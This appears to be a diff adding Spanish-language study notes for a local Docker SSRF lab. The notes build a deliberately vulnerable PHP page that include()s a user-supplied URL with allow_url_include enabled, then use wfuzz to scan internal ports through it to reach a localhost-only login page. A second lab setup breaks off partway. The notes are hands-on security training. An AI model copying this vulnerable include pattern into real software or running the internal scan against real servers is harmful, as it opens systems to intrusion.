@@ -3769,5 +3769,139 @@ En este caso, estamos utilizando la opción '**--driver=bridge**' para indicar q
 La opción --driver nos permite especificar el controlador de red que deseamos utilizar, que puede ser "**bridge**", "**overlay**", "**macvlan**", "**ipvlan**" u otro controlador compatible con Docker.
 
 ```bash
+docker pull ubuntu:latest
+docker images
+docker run -dit --name ssrf_first_lab ubuntu
+docker ps
+docker exec -it ssrf_first_lab bash
+apt update && apt install apache2 php nano python3 lsof -y
+lsof -i:80
+service apache2 start
+lsof -i:80
+cd /var/www/html
+rm index.html
+nano utility.php
+<?php
+
+    if(isset($_GET['url'])){
+        $url = $_GET['url'];
+        echo "\n[+] Listando el contenido de la web " . $url . "\n\n"; 
+        include($url);
+    }else{
+        echo "\n[!] No se ha proporcionado ningun valor para el parametro URL\n\n";
+    }
+
+?>
+
+# Nos vamos al navegador para ver utility.php
+ipDelContenedor/utility.php?url=https://google.es
+
+find / -name php.ini 2>/dev/null
+nano /etc/php/8.1/apache2/php.ini
+# Filtramos por: allow_url_include y la ponemos en On 
+
+service apache2 restart
+# Nos vamos al navegador para ver utility.php
+ipDelContenedor/utility.php?url=https://google.es # Deberiamos poder ver google
+
+# En la misma ruta /var/www/html
+nano login.html # Metemos una plantilla de html de login html sample code
+# Añadimos algun lugar para saber que es el de produccion
+
+cp login.html /tmp/
+
+cd /tmp/
+nano index.html # Modificamos para agregar algo que diga preproduccion y añadimos mas parametro o formularios para identificar que es el de pre
+
+python3 -m http.server 4646
+
+# Vemos en el navegador que esto lo vemos desde nuestra máquina
+
+python3 -m http.server 4646 --bind 127.0.0.1 # Ya no deberiamos poder verlo
+
+# Dejamos corriendo el servidor y nos vamos al de produccion
+
+
+ipDelContenedor/utility.php?url=http://127.0.0.1:port
+
+# Aplicaremos fuzzing
+
+wfuzz -c -t 200 -z range,1-65535 "http://ipDelContenedor/utility.php?url=http://127.0.0.1:FUZZ"
+
+# Le damos a enter y cancelamos rapido ctrl c ctrl z
+kill %
+# Todas las respuestas nos devuelven 3 lineas
+
+# Ocultamos las que nos devuelven 3 lineas
+wfuzz -c -t 200 --hl=3 -z range,1-65535 "http://ipDelContenedor/utility.php?url=http://127.0.0.1:FUZZ"
+
+# Nos debe mostrar el puerto 80 y el puerto 4646
+
+# Volvemos a matar cuando lo veamos
+
+# En el navegador
+http://ipDelContenedor/utility.php?url=http://127.0.0.1:4646/login.html
+
+
+
+
+
+### SEGUNDO CASO O SEGUNDO LAB
+```
+
+![SEGUNDO LAB](/img/Captura%20de%20pantalla%202026-03-16%20211538.png)
+
+```bash
+docker rm $(docker ps -a -q) --force
+docker network ls
+docker network create --driver=bridge network1 --subnet=10.10.0.0/24
+docker network ls
+docker images
+docker ps
+docker run -dit --name PRO ubuntu
+docker ps
+docker network connect network1 PRO
+docker exec -it PRO bash
+hostname -I # Debemos de ver las dos direcciones IP en el contenedor
+apt update && apt install iproute2 iputils-ping
+ip a
+# Despues de crear segunda maquina hacer ping para ver conexion
+ping -c 1 10.0.0.3
+exit # SaLimos del contenedor
+docker ps
+
+# Creamos segunda máquina
+docker run -dit --name PRE --network=network1 ubuntu
+docker ps # Debemos de ver las dos maquinas
+docker exec -it PRE bash
+hostname -I
+apt update && apt install iproute2 iputils-ping
+ip a # Vemos solo una if
+exit
+
+# Creamos tercera máquina
+docker run -dit --name ATTACKER ubuntu
+docker exec -it ATTACKER bash
+hostname -I
+apt update && apt install iproute2 iputils-ping -y
+ip a
+ping -c 1 172.17.0.2
+ping -c 1 10.10.0.2
+exit
+
+
+# Nos movemos al entorno de PRO
+docker exec -it PRO bash
+apt install apache2 php nano -y 
+service apache2 start
+
+
+
+
+
+
+
+
+
 
 ```
